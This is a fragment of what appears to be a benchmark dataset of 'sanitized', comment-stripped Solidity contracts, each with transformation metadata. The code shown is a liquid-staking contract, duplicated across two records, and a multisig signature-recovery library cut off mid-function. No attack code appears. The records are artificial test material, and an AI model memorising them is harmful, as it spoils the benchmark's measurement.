      "code": "pragma solidity ^0.8.20;\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n\"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20Upgradeable} from \"openzeppelin-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport {ProtocolEvents} from \"./interfaces/ProtocolEvents.sol\";\nimport {IDepositContract} from \"./interfaces/IDepositContract.sol\";\nimport {IMETH} from \"./interfaces/IMETH.sol\";\nimport {IOracleReadRecord, OracleRecord} from \"./interfaces/IOracle.sol\";\nimport {IPauserRead} from \"./interfaces/IPauser.sol\";\nimport {IStaking, IStakingReturnsWrite, IStakingInitiationRead} from \"./interfaces/IStaking.sol\";\nimport {UnstakeRequest, IUnstakeRequestsManager} from \"./interfaces/IUnstakeRequestsManager.sol\";\nimport {ILiquidityBuffer} from \"./liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\ninterface StakingEvents {\nevent Staked(address indexed staker, uint256 ethAmount, uint256 mETHAmount);\nevent UnstakeRequested(uint256 indexed id, address indexed staker, uint256 ethAmount, uint256 mETHLocked);\nevent UnstakeRequestClaimed(uint256 indexed id, address indexed staker);\nevent ValidatorInitiated(bytes32 indexed id, uint256 indexed operatorID, bytes pubkey, uint256 amountDeposited);\nevent AllocatedETHToUnstakeRequestsManager(uint256 amount);\nevent AllocatedETHToDeposits(uint256 amount);\nevent ReturnsReceived(uint256 amount);\nevent ReturnsReceivedFromLiquidityBuffer(uint256 amount);\nevent AllocatedETHToLiquidityBuffer(uint256 amount);\n}\ncontract Staking is Initializable, AccessControlEnumerableUpgradeable, IStaking, StakingEvents, ProtocolEvents {\nerror DoesNotReceiveETH();\nerror InvalidConfiguration();\nerror MaximumValidatorDepositExceeded();\nerror MaximumMETHSupplyExceeded();\nerror MinimumStakeBoundNotSatisfied();\nerror MinimumUnstakeBoundNotSatisfied();\nerror MinimumValidatorDepositNotSatisfied();\nerror NotEnoughDepositETH();\nerror NotEnoughUnallocatedETH();\nerror NotReturnsAggregator();\nerror NotLiquidityBuffer();\nerror NotUnstakeRequestsManager();\nerror Paused();\nerror PreviouslyUsedValidator();\nerror ZeroAddress();\nerror InvalidDepositRoot(bytes32);\nerror StakeBelowMinimumMETHAmount(uint256 methAmount, uint256 expectedMinimum);\nerror UnstakeBelowMinimumETHAmount(uint256 ethAmount, uint256 expectedMinimum);\nerror InvalidWithdrawalCredentialsWrongLength(uint256);\nerror InvalidWithdrawalCredentialsNotETH1(bytes12);\nerror InvalidWithdrawalCredentialsWrongAddress(address);\nbytes32 public constant STAKING_MANAGER_ROLE = keccak256(\"STAKING_MANAGER_ROLE\");\nbytes32 public constant ALLOCATOR_SERVICE_ROLE = keccak256(\"ALLOCATER_SERVICE_ROLE\");\nbytes32 public constant INITIATOR_SERVICE_ROLE = keccak256(\"INITIATOR_SERVICE_ROLE\");\nbytes32 public constant STAKING_ALLOWLIST_MANAGER_ROLE = keccak256(\"STAKING_ALLOWLIST_MANAGER_ROLE\");\nbytes32 public constant STAKING_ALLOWLIST_ROLE = keccak256(\"STAKING_ALLOWLIST_ROLE\");\nbytes32 public constant TOP_UP_ROLE = keccak256(\"TOP_UP_ROLE\");\nstruct ValidatorParams {\nuint256 operatorID;\nuint256 depositAmount;\nbytes pubkey;\nbytes withdrawalCredentials;\nbytes signature;\nbytes32 depositDataRoot;\n}\nmapping(bytes pubkey => bool exists) public usedValidators;\nuint256 public totalDepositedInValidators;\nuint256 public numInitiatedValidators;\nuint256 public unallocatedETH;\nuint256 public allocatedETHForDeposits;\nuint256 public minimumStakeBound;\nuint256 public minimumUnstakeBound;\nuint16 public exchangeAdjustmentRate;\nuint16 internal constant _BASIS_POINTS_DENOMINATOR = 10_000;\nuint16 internal constant _MAX_EXCHANGE_ADJUSTMENT_RATE = _BASIS_POINTS_DENOMINATOR / 10;\nuint256 public minimumDepositAmount;\nuint256 public maximumDepositAmount;\nIDepositContract public depositContract;\nIMETH public mETH;\nIOracleReadRecord public oracle;\nIPauserRead public pauser;\nIUnstakeRequestsManager public unstakeRequestsManager;\naddress public withdrawalWallet;\naddress public returnsAggregator;\nbool public isStakingAllowlist;\nuint256 public initializationBlockNumber;\nuint256 public maximumMETHSupply;\nILiquidityBuffer public liquidityBuffer;\nstruct Init {\naddress admin;\naddress manager;\naddress allocatorService;\naddress initiatorService;\naddress returnsAggregator;\naddress withdrawalWallet;\nIMETH mETH;\nIDepositContract depositContract;\nIOracleReadRecord oracle;\nIPauserRead pauser;\nIUnstakeRequestsManager unstakeRequestsManager;\n}\nconstructor() {\n_disableInitializers();\n}\nfunction initialize(Init memory init) external initializer {\n__AccessControlEnumerable_init();\n_grantRole(DEFAULT_ADMIN_ROLE, init.admin);\n_grantRole(STAKING_MANAGER_ROLE, init.manager);\n_grantRole(ALLOCATOR_SERVICE_ROLE, init.allocatorService);\n_grantRole(INITIATOR_SERVICE_ROLE, init.initiatorService);\n_setRoleAdmin(STAKING_ALLOWLIST_MANAGER_ROLE, STAKING_MANAGER_ROLE);\n_setRoleAdmin(STAKING_ALLOWLIST_ROLE, STAKING_ALLOWLIST_MANAGER_ROLE);\nmETH = init.mETH;\ndepositContract = init.depositContract;\noracle = init.oracle;\npauser = init.pauser;\nreturnsAggregator = init.returnsAggregator;\nunstakeRequestsManager = init.unstakeRequestsManager;\nwithdrawalWallet = init.withdrawalWallet;\nminimumStakeBound = 0.1 ether;\nminimumUnstakeBound = 0.01 ether;\nminimumDepositAmount = 32 ether;\nmaximumDepositAmount = 32 ether;\nisStakingAllowlist = true;\ninitializationBlockNumber = block.number;\nmaximumMETHSupply = 1024 ether;\n}\nfunction initializeV2(ILiquidityBuffer lb) public reinitializer(2) {\nliquidityBuffer = lb;\n}\nfunction stake(uint256 minMETHAmount) external payable {\nif (pauser.isStakingPaused()) {\nrevert Paused();\n}\nif (isStakingAllowlist) {\n_checkRole(STAKING_ALLOWLIST_ROLE);\n}\nif (msg.value < minimumStakeBound) {\nrevert MinimumStakeBoundNotSatisfied();\n}\nuint256 mETHMintAmount = ethToMETH(msg.value);\nif (mETHMintAmount + mETH.totalSupply() > maximumMETHSupply) {\nrevert MaximumMETHSupplyExceeded();\n}\nif (mETHMintAmount < minMETHAmount) {\nrevert StakeBelowMinimumMETHAmount(mETHMintAmount, minMETHAmount);\n}\nunallocatedETH += msg.value;\nemit Staked(msg.sender, msg.value, mETHMintAmount);\nmETH.mint(msg.sender, mETHMintAmount);\n}\nfunction unstakeRequest(uint128 methAmount, uint128 minETHAmount) external returns (uint256) {\nreturn _unstakeRequest(methAmount, minETHAmount);\n}\nfunction unstakeRequestWithPermit(\nuint128 methAmount,\nuint128 minETHAmount,\nuint256 deadline,\nuint8 v,\nbytes32 r,\nbytes32 s\n) external returns (uint256) {\nSafeERC20Upgradeable.safePermit(mETH, msg.sender, address(this), methAmount, deadline, v, r, s);\nreturn _unstakeRequest(methAmount, minETHAmount);\n}\nfunction _unstakeRequest(uint128 methAmount, uint128 minETHAmount) internal returns (uint256) {\nif (pauser.isUnstakeRequestsAndClaimsPaused()) {\nrevert Paused();\n}\nif (methAmount < minimumUnstakeBound) {\nrevert MinimumUnstakeBoundNotSatisfied();\n}\nuint128 ethAmount = uint128(mETHToETH(methAmount));\nif (ethAmount < minETHAmount) {\nrevert UnstakeBelowMinimumETHAmount(ethAmount, minETHAmount);\n}\nuint256 requestID =\nunstakeRequestsManager.create({requester: msg.sender, mETHLocked: methAmount, ethRequested: ethAmount});\nemit UnstakeRequested({id: requestID, staker: msg.sender, ethAmount: ethAmount, mETHLocked: methAmount});\nSafeERC20Upgradeable.safeTransferFrom(mETH, msg.sender, address(unstakeRequestsManager), methAmount);\nreturn requestID;\n}\nfunction ethToMETH(uint256 ethAmount) public view returns (uint256) {\nif (mETH.totalSupply() == 0) {\nreturn ethAmount;\n}\nuint256 adjustedTotalControlled = Math.mulDiv(\ntotalControlled(), _BASIS_POINTS_DENOMINATOR + exchangeAdjustmentRate, _BASIS_POINTS_DENOMINATOR\n);\nreturn Math.mulDiv(ethAmount, mETH.totalSupply(), adjustedTotalControlled);\n}\nfunction mETHToETH(uint256 mETHAmount) public view returns (uint256) {\nif (mETH.totalSupply() == 0) {\nreturn mETHAmount;\n}\nreturn Math.mulDiv(mETHAmount, totalControlled(), mETH.totalSupply());\n}\nfunction totalControlled() public view returns (uint256) {\nOracleRecord memory record = oracle.latestRecord();\nuint256 total = 0;\ntotal += unallocatedETH;\ntotal += allocatedETHForDeposits;\ntotal += totalDepositedInValidators - record.cumulativeProcessedDepositAmount;\ntotal += record.currentTotalValidatorBalance;\ntotal += liquidityBuffer.getAvailableBalance();\ntotal -= liquidityBuffer.cumulativeDrawdown();\ntotal += unstakeRequestsManager.balance();\nreturn total;\n}\nfunction receiveReturns() external payable onlyReturnsAggregator {\nemit ReturnsReceived(msg.value);\nunallocatedETH += msg.value;\n}\nfunction receiveReturnsFromLiquidityBuffer() external payable onlyLiquidityBuffer {\nemit ReturnsReceivedFromLiquidityBuffer(msg.value);\nunallocatedETH += msg.value;\n}\nmodifier onlyReturnsAggregator() {\nif (msg.sender != returnsAggregator) {\nrevert NotReturnsAggregator();\n}\n_;\n}\nmodifier onlyLiquidityBuffer() {\nif (msg.sender != address(liquidityBuffer)) {\nrevert NotLiquidityBuffer();\n}\n_;\n}\nmodifier onlyUnstakeRequestsManager() {\nif (msg.sender != address(unstakeRequestsManager)) {\nrevert NotUnstakeRequestsManager();\n}\n_;\n}\nmodifier notZeroAddress(address addr) {\nif (addr == address(0)) {\nrevert ZeroAddress();\n}\n_;\n}\nreceive() external payable {\nrevert DoesNotReceiveETH();\n}\nfallback() external payable {\nrevert DoesNotReceiveETH();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 53,
        "mode": "compressed",
        "original_lines": 309,
        "transformed_lines": 245,
        "original_chars": 11744,
        "transformed_chars": 9312,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_gs_028",
      "transformed_id": "ss_l1_compressed_sn_gs_028",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.20;\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n\"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20Upgradeable} from \"openzeppelin-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport {ProtocolEvents} from \"./interfaces/ProtocolEvents.sol\";\nimport {IDepositContract} from \"./interfaces/IDepositContract.sol\";\nimport {IMETH} from \"./interfaces/IMETH.sol\";\nimport {IOracleReadRecord, OracleRecord} from \"./interfaces/IOracle.sol\";\nimport {IPauserRead} from \"./interfaces/IPauser.sol\";\nimport {IStaking, IStakingReturnsWrite, IStakingInitiationRead} from \"./interfaces/IStaking.sol\";\nimport {UnstakeRequest, IUnstakeRequestsManager} from \"./interfaces/IUnstakeRequestsManager.sol\";\nimport {ILiquidityBuffer} from \"./liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\ninterface StakingEvents {\nevent Staked(address indexed staker, uint256 ethAmount, uint256 mETHAmount);\nevent UnstakeRequested(uint256 indexed id, address indexed staker, uint256 ethAmount, uint256 mETHLocked);\nevent UnstakeRequestClaimed(uint256 indexed id, address indexed staker);\nevent ValidatorInitiated(bytes32 indexed id, uint256 indexed operatorID, bytes pubkey, uint256 amountDeposited);\nevent AllocatedETHToUnstakeRequestsManager(uint256 amount);\nevent AllocatedETHToDeposits(uint256 amount);\nevent ReturnsReceived(uint256 amount);\nevent ReturnsReceivedFromLiquidityBuffer(uint256 amount);\nevent AllocatedETHToLiquidityBuffer(uint256 amount);\n}\ncontract Staking is Initializable, AccessControlEnumerableUpgradeable, IStaking, StakingEvents, ProtocolEvents {\nerror DoesNotReceiveETH();\nerror InvalidConfiguration();\nerror MaximumValidatorDepositExceeded();\nerror MaximumMETHSupplyExceeded();\nerror MinimumStakeBoundNotSatisfied();\nerror MinimumUnstakeBoundNotSatisfied();\nerror MinimumValidatorDepositNotSatisfied();\nerror NotEnoughDepositETH();\nerror NotEnoughUnallocatedETH();\nerror NotReturnsAggregator();\nerror NotLiquidityBuffer();\nerror NotUnstakeRequestsManager();\nerror Paused();\nerror PreviouslyUsedValidator();\nerror ZeroAddress();\nerror InvalidDepositRoot(bytes32);\nerror StakeBelowMinimumMETHAmount(uint256 methAmount, uint256 expectedMinimum);\nerror UnstakeBelowMinimumETHAmount(uint256 ethAmount, uint256 expectedMinimum);\nerror InvalidWithdrawalCredentialsWrongLength(uint256);\nerror InvalidWithdrawalCredentialsNotETH1(bytes12);\nerror InvalidWithdrawalCredentialsWrongAddress(address);\nbytes32 public constant STAKING_MANAGER_ROLE = keccak256(\"STAKING_MANAGER_ROLE\");\nbytes32 public constant ALLOCATOR_SERVICE_ROLE = keccak256(\"ALLOCATER_SERVICE_ROLE\");\nbytes32 public constant INITIATOR_SERVICE_ROLE = keccak256(\"INITIATOR_SERVICE_ROLE\");\nbytes32 public constant STAKING_ALLOWLIST_MANAGER_ROLE = keccak256(\"STAKING_ALLOWLIST_MANAGER_ROLE\");\nbytes32 public constant STAKING_ALLOWLIST_ROLE = keccak256(\"STAKING_ALLOWLIST_ROLE\");\nbytes32 public constant TOP_UP_ROLE = keccak256(\"TOP_UP_ROLE\");\nstruct ValidatorParams {\nuint256 operatorID;\nuint256 depositAmount;\nbytes pubkey;\nbytes withdrawalCredentials;\nbytes signature;\nbytes32 depositDataRoot;\n}\nmapping(bytes pubkey => bool exists) public usedValidators;\nuint256 public totalDepositedInValidators;\nuint256 public numInitiatedValidators;\nuint256 public unallocatedETH;\nuint256 public allocatedETHForDeposits;\nuint256 public minimumStakeBound;\nuint256 public minimumUnstakeBound;\nuint16 public exchangeAdjustmentRate;\nuint16 internal constant _BASIS_POINTS_DENOMINATOR = 10_000;\nuint16 internal constant _MAX_EXCHANGE_ADJUSTMENT_RATE = _BASIS_POINTS_DENOMINATOR / 10;\nuint256 public minimumDepositAmount;\nuint256 public maximumDepositAmount;\nIDepositContract public depositContract;\nIMETH public mETH;\nIOracleReadRecord public oracle;\nIPauserRead public pauser;\nIUnstakeRequestsManager public unstakeRequestsManager;\naddress public withdrawalWallet;\naddress public returnsAggregator;\nbool public isStakingAllowlist;\nuint256 public initializationBlockNumber;\nuint256 public maximumMETHSupply;\nILiquidityBuffer public liquidityBuffer;\nstruct Init {\naddress admin;\naddress manager;\naddress allocatorService;\naddress initiatorService;\naddress returnsAggregator;\naddress withdrawalWallet;\nIMETH mETH;\nIDepositContract depositContract;\nIOracleReadRecord oracle;\nIPauserRead pauser;\nIUnstakeRequestsManager unstakeRequestsManager;\n}\nconstructor() {\n_disableInitializers();\n}\nfunction initialize(Init memory init) external initializer {\n__AccessControlEnumerable_init();\n_grantRole(DEFAULT_ADMIN_ROLE, init.admin);\n_grantRole(STAKING_MANAGER_ROLE, init.manager);\n_grantRole(ALLOCATOR_SERVICE_ROLE, init.allocatorService);\n_grantRole(INITIATOR_SERVICE_ROLE, init.initiatorService);\n_setRoleAdmin(STAKING_ALLOWLIST_MANAGER_ROLE, STAKING_MANAGER_ROLE);\n_setRoleAdmin(STAKING_ALLOWLIST_ROLE, STAKING_ALLOWLIST_MANAGER_ROLE);\nmETH = init.mETH;\ndepositContract = init.depositContract;\noracle = init.oracle;\npauser = init.pauser;\nreturnsAggregator = init.returnsAggregator;\nunstakeRequestsManager = init.unstakeRequestsManager;\nwithdrawalWallet = init.withdrawalWallet;\nminimumStakeBound = 0.1 ether;\nminimumUnstakeBound = 0.01 ether;\nminimumDepositAmount = 32 ether;\nmaximumDepositAmount = 32 ether;\nisStakingAllowlist = true;\ninitializationBlockNumber = block.number;\nmaximumMETHSupply = 1024 ether;\n}\nfunction initializeV2(ILiquidityBuffer lb) public reinitializer(2) {\nliquidityBuffer = lb;\n}\nfunction stake(uint256 minMETHAmount) external payable {\nif (pauser.isStakingPaused()) {\nrevert Paused();\n}\nif (isStakingAllowlist) {\n_checkRole(STAKING_ALLOWLIST_ROLE);\n}\nif (msg.value < minimumStakeBound) {\nrevert MinimumStakeBoundNotSatisfied();\n}\nuint256 mETHMintAmount = ethToMETH(msg.value);\nif (mETHMintAmount + mETH.totalSupply() > maximumMETHSupply) {\nrevert MaximumMETHSupplyExceeded();\n}\nif (mETHMintAmount < minMETHAmount) {\nrevert StakeBelowMinimumMETHAmount(mETHMintAmount, minMETHAmount);\n}\nunallocatedETH += msg.value;\nemit Staked(msg.sender, msg.value, mETHMintAmount);\nmETH.mint(msg.sender, mETHMintAmount);\n}\nfunction unstakeRequest(uint128 methAmount, uint128 minETHAmount) external returns (uint256) {\nreturn _unstakeRequest(methAmount, minETHAmount);\n}\nfunction unstakeRequestWithPermit(\nuint128 methAmount,\nuint128 minETHAmount,\nuint256 deadline,\nuint8 v,\nbytes32 r,\nbytes32 s\n) external returns (uint256) {\nSafeERC20Upgradeable.safePermit(mETH, msg.sender, address(this), methAmount, deadline, v, r, s);\nreturn _unstakeRequest(methAmount, minETHAmount);\n}\nfunction _unstakeRequest(uint128 methAmount, uint128 minETHAmount) internal returns (uint256) {\nif (pauser.isUnstakeRequestsAndClaimsPaused()) {\nrevert Paused();\n}\nif (methAmount < minimumUnstakeBound) {\nrevert MinimumUnstakeBoundNotSatisfied();\n}\nuint128 ethAmount = uint128(mETHToETH(methAmount));\nif (ethAmount < minETHAmount) {\nrevert UnstakeBelowMinimumETHAmount(ethAmount, minETHAmount);\n}\nuint256 requestID =\nunstakeRequestsManager.create({requester: msg.sender, mETHLocked: methAmount, ethRequested: ethAmount});\nemit UnstakeRequested({id: requestID, staker: msg.sender, ethAmount: ethAmount, mETHLocked: methAmount});\nSafeERC20Upgradeable.safeTransferFrom(mETH, msg.sender, address(unstakeRequestsManager), methAmount);\nreturn requestID;\n}\nfunction ethToMETH(uint256 ethAmount) public view returns (uint256) {\nif (mETH.totalSupply() == 0) {\nreturn ethAmount;\n}\nuint256 adjustedTotalControlled = Math.mulDiv(\ntotalControlled(), _BASIS_POINTS_DENOMINATOR + exchangeAdjustmentRate, _BASIS_POINTS_DENOMINATOR\n);\nreturn Math.mulDiv(ethAmount, mETH.totalSupply(), adjustedTotalControlled);\n}\nfunction mETHToETH(uint256 mETHAmount) public view returns (uint256) {\nif (mETH.totalSupply() == 0) {\nreturn mETHAmount;\n}\nreturn Math.mulDiv(mETHAmount, totalControlled(), mETH.totalSupply());\n}\nfunction totalControlled() public view returns (uint256) {\nOracleRecord memory record = oracle.latestRecord();\nuint256 total = 0;\ntotal += unallocatedETH;\ntotal += allocatedETHForDeposits;\ntotal += totalDepositedInValidators - record.cumulativeProcessedDepositAmount;\ntotal += record.currentTotalValidatorBalance;\ntotal += liquidityBuffer.getAvailableBalance();\ntotal -= liquidityBuffer.cumulativeDrawdown();\ntotal += unstakeRequestsManager.balance();\nreturn total;\n}\nfunction receiveReturns() external payable onlyReturnsAggregator {\nemit ReturnsReceived(msg.value);\nunallocatedETH += msg.value;\n}\nfunction receiveReturnsFromLiquidityBuffer() external payable onlyLiquidityBuffer {\nemit ReturnsReceivedFromLiquidityBuffer(msg.value);\nunallocatedETH += msg.value;\n}\nmodifier onlyReturnsAggregator() {\nif (msg.sender != returnsAggregator) {\nrevert NotReturnsAggregator();\n}\n_;\n}\nmodifier onlyLiquidityBuffer() {\nif (msg.sender != address(liquidityBuffer)) {\nrevert NotLiquidityBuffer();\n}\n_;\n}\nmodifier onlyUnstakeRequestsManager() {\nif (msg.sender != address(unstakeRequestsManager)) {\nrevert NotUnstakeRequestsManager();\n}\n_;\n}\nmodifier notZeroAddress(address addr) {\nif (addr == address(0)) {\nrevert ZeroAddress();\n}\n_;\n}\nreceive() external payable {\nrevert DoesNotReceiveETH();\n}\nfallback() external payable {\nrevert DoesNotReceiveETH();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 53,
        "mode": "compressed",
        "original_lines": 309,
        "transformed_lines": 245,
        "original_chars": 11744,
        "transformed_chars": 9312,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_gs_029",
      "transformed_id": "ss_l1_compressed_sn_gs_029",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.27;\nimport { LibBytes } from \"../../utils/LibBytes.sol\";\nimport { LibOptim } from \"../../utils/LibOptim.sol\";\nimport { Payload } from \"../Payload.sol\";\nimport { ICheckpointer, Snapshot } from \"../interfaces/ICheckpointer.sol\";\nimport { IERC1271, IERC1271_MAGIC_VALUE_HASH } from \"../interfaces/IERC1271.sol\";\nimport { ISapient, ISapientCompact } from \"../interfaces/ISapient.sol\";\nusing LibBytes for bytes;\nusing Payload for Payload.Decoded;\nlibrary BaseSig {\nuint256 internal constant FLAG_SIGNATURE_HASH = 0;\nuint256 internal constant FLAG_ADDRESS = 1;\nuint256 internal constant FLAG_SIGNATURE_ERC1271 = 2;\nuint256 internal constant FLAG_NODE = 3;\nuint256 internal constant FLAG_BRANCH = 4;\nuint256 internal constant FLAG_SUBDIGEST = 5;\nuint256 internal constant FLAG_NESTED = 6;\nuint256 internal constant FLAG_SIGNATURE_ETH_SIGN = 7;\nuint256 internal constant FLAG_SIGNATURE_ANY_ADDRESS_SUBDIGEST = 8;\nuint256 internal constant FLAG_SIGNATURE_SAPIENT = 9;\nuint256 internal constant FLAG_SIGNATURE_SAPIENT_COMPACT = 10;\nerror LowWeightChainedSignature(bytes _signature, uint256 _threshold, uint256 _weight);\nerror InvalidERC1271Signature(bytes32 _opHash, address _signer, bytes _signature);\nerror WrongChainedCheckpointOrder(uint256 _nextCheckpoint, uint256 _checkpoint);\nerror UnusedSnapshot(Snapshot _snapshot);\nerror InvalidSignatureFlag(uint256 _flag);\nfunction _leafForAddressAndWeight(address _addr, uint256 _weight) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(\"Sequence signer:\\n\", _addr, _weight));\n}\nfunction _leafForNested(bytes32 _node, uint256 _threshold, uint256 _weight) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(\"Sequence nested config:\\n\", _node, _threshold, _weight));\n}\nfunction _leafForSapient(address _addr, uint256 _weight, bytes32 _imageHash) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(\"Sequence sapient config:\\n\", _addr, _weight, _imageHash));\n}\nfunction _leafForHardcodedSubdigest(\nbytes32 _subdigest\n) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(\"Sequence static digest:\\n\", _subdigest));\n}\nfunction _leafForAnyAddressSubdigest(\nbytes32 _anyAddressSubdigest\n) internal pure returns (bytes32) {\nreturn keccak256(abi.encodePacked(\"Sequence any address subdigest:\\n\", _anyAddressSubdigest));\n}\nfunction recover(\nPayload.Decoded memory _payload,\nbytes calldata _signature,\nbool _ignoreCheckpointer,\naddress _checkpointer\n) internal view returns (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint, bytes32 opHash) {\n(uint256 signatureFlag, uint256 rindex) = _signature.readFirstUint8();\nSnapshot memory snapshot;\nif (signatureFlag & 0x40 == 0x40 && _checkpointer == address(0)) {\n(_checkpointer, rindex) = _signature.readAddress(rindex);\nif (!_ignoreCheckpointer) {\nuint256 checkpointerDataSize;\n(checkpointerDataSize, rindex) = _signature.readUint24(rindex);\nbytes memory checkpointerData = _signature[rindex:rindex + checkpointerDataSize];\nsnapshot = ICheckpointer(_checkpointer).snapshotFor(address(this), checkpointerData);\nrindex += checkpointerDataSize;\n}\n}\nif (signatureFlag & 0x01 == 0x01) {\nreturn recoverChained(_payload, _checkpointer, snapshot, _signature[rindex:]);\n}\n_payload.noChainId = signatureFlag & 0x02 == 0x02;\n{\nuint256 checkpointSize = (signatureFlag & 0x1c) >> 2;\n(checkpoint, rindex) = _signature.readUintX(rindex, checkpointSize);\n}\n{\nuint256 thresholdSize = ((signatureFlag & 0x20) >> 5) + 1;\n(threshold, rindex) = _signature.readUintX(rindex, thresholdSize);\n}\nopHash = _payload.hash();\n(weight, imageHash) = recoverBranch(_payload, opHash, _signature[rindex:]);\nimageHash = LibOptim.fkeccak256(imageHash, bytes32(threshold));\nimageHash = LibOptim.fkeccak256(imageHash, bytes32(checkpoint));\nimageHash = LibOptim.fkeccak256(imageHash, bytes32(uint256(uint160(_checkpointer))));\nif (snapshot.imageHash != bytes32(0) && snapshot.imageHash != imageHash && checkpoint <= snapshot.checkpoint) {\nrevert UnusedSnapshot(snapshot);\n}\n}\nfunction recoverChained(\nPayload.Decoded memory _payload,\naddress _checkpointer,\nSnapshot memory _snapshot,\nbytes calldata _signature\n) internal view returns (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint, bytes32 opHash) {\nPayload.Decoded memory linkedPayload;\nlinkedPayload.kind = Payload.KIND_CONFIG_UPDATE;\nuint256 rindex;\nuint256 prevCheckpoint = type(uint256).max;\nwhile (rindex < _signature.length) {\nuint256 nrindex;\n{\nuint256 sigSize;\n(sigSize, rindex) = _signature.readUint24(rindex);\nnrindex = sigSize + rindex;\n}\naddress checkpointer = nrindex == _signature.length ? _checkpointer : address(0);\nif (prevCheckpoint == type(uint256).max) {\n(threshold, weight, imageHash, checkpoint, opHash) =\nrecover(_payload, _signature[rindex:nrindex], true, checkpointer);\n} else {\n(threshold, weight, imageHash, checkpoint,) =\nrecover(linkedPayload, _signature[rindex:nrindex], true, checkpointer);\n}\nif (weight < threshold) {\nrevert LowWeightChainedSignature(_signature[rindex:nrindex], threshold, weight);\n}\nrindex = nrindex;\nif (_snapshot.imageHash == imageHash) {\n_snapshot.imageHash = bytes32(0);\n}\nif (checkpoint >= prevCheckpoint) {\nrevert WrongChainedCheckpointOrder(checkpoint, prevCheckpoint);\n}\nlinkedPayload.imageHash = imageHash;\nprevCheckpoint = checkpoint;\n}\nif (_snapshot.imageHash != bytes32(0) && checkpoint <= _snapshot.checkpoint) {\nrevert UnusedSnapshot(_snapshot);\n}\n}\nfunction recoverBranch(\nPayload.Decoded memory _payload,\nbytes32 _opHash,\nbytes calldata _signature\n) internal view returns (uint256 weight, bytes32 root) {\nunchecked {\nuint256 rindex;\nwhile (rindex < _signature.length) {\nuint256 firstByte;\n(firstByte, rindex) = _signature.readUint8(rindex);\nuint256 flag = (firstByte & 0xf0) >> 4;\nif (flag == FLAG_SIGNATURE_HASH) {\nuint8 addrWeight = uint8(firstByte & 0x0f);\nif (addrWeight == 0) {\n(addrWeight, rindex) = _signature.readUint8(rindex);\n}\nbytes32 r;\nbytes32 s;\nuint8 v;\n(r, s, v, rindex) = _signature.readRSVCompact(rindex);\naddress addr = ecrecover(_opHash, v, r, s);\nweight += addrWeight;\nbytes32 node = _leafForAddressAndWeight(addr, addrWeight);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_ADDRESS) {\nuint8 addrWeight = uint8(firstByte & 0x0f);\nif (addrWeight == 0) {\n(addrWeight, rindex) = _signature.readUint8(rindex);\n}\naddress addr;\n(addr, rindex) = _signature.readAddress(rindex);\nbytes32 node = _leafForAddressAndWeight(addr, addrWeight);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_SIGNATURE_ERC1271) {\nuint8 addrWeight = uint8(firstByte & 0x03);\nif (addrWeight == 0) {\n(addrWeight, rindex) = _signature.readUint8(rindex);\n}\naddress addr;\n(addr, rindex) = _signature.readAddress(rindex);\nuint256 sizeSize = uint8(firstByte & 0x0c) >> 2;\nuint256 size;\n(size, rindex) = _signature.readUintX(rindex, sizeSize);\nuint256 nrindex = rindex + size;\nif (IERC1271(addr).isValidSignature(_opHash, _signature[rindex:nrindex]) != IERC1271_MAGIC_VALUE_HASH) {\nrevert InvalidERC1271Signature(_opHash, addr, _signature[rindex:nrindex]);\n}\nrindex = nrindex;\nweight += addrWeight;\nbytes32 node = _leafForAddressAndWeight(addr, addrWeight);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_NODE) {\nbytes32 node;\n(node, rindex) = _signature.readBytes32(rindex);\nroot = root != bytes32(0) ? LibOptim.fkeccak256(root, node) : node;\ncontinue;\n}\nif (flag == FLAG_BRANCH) {\nuint256 sizeSize = uint8(firstByte & 0x0f);\nuint256 size;\n(size, rindex) = _signature.readUintX(rindex, sizeSize);\nuint256 nrindex = rindex + size;\n(uint256 nweight, bytes32 node) = recoverBranch(_payload, _opHash, _signature[rindex:nrindex]);\nrindex = nrindex;\nweight += nweight;\nroot = LibOptim.fkeccak256(root, node);\ncontinue;\n}\nif (flag == FLAG_NESTED) {\nuint256 externalWeight = uint8(firstByte & 0x0c) >> 2;\nif (externalWeight == 0) {\n(externalWeight, rindex) = _signature.readUint8(rindex);\n}\nuint256 internalThreshold = uint8(firstByte & 0x03);\nif (internalThreshold == 0) {\n(internalThreshold, rindex) = _signature.readUint16(rindex);\n}\nuint256 size;\n(size, rindex) = _signature.readUint24(rindex);\nuint256 nrindex = rindex + size;\n(uint256 internalWeight, bytes32 internalRoot) = 